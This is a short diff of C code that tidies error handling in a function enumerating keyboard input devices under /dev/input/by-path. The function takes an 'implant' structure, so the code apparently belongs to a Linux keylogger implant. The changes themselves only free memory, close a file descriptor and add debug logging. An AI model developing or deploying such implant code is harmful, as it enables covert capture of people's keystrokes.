@@ -60,12 +60,20 @@ uint8_t fetch_available_keyboards(implant_t *instance) {
     }
 
     possible_paths = scandir(dev_input_by_path, &char_devices, &is_kbd, &alphasort);
-    if (-1 == possible_paths || 0 > chdir(dev_input_by_path)) {
-
+    if (-1 == possible_paths) {
 #ifdef DEBUG
         DEBUG_LOG("could not find possible keyboard paths\n");
 #endif
+        return ERROR;
+    }
 
+    if (0 > chdir(dev_input_by_path)) {
+#ifdef DEBUG
+        DEBUG_LOG("could not chdir to %s\n", dev_input_by_path);
+#endif
+        for (int i = 0; i < possible_paths; i++)
+            free(char_devices[i]);
+        free(char_devices);
         return ERROR;
     }
 
@@ -109,6 +117,7 @@ uint8_t fetch_available_keyboards(implant_t *instance) {
             DEBUG_LOG("[!] strncpy: kbd->name could not be copied\n");
 #endif
 
+            close(kbd->fd);
             free(kbd);
             continue;
         }
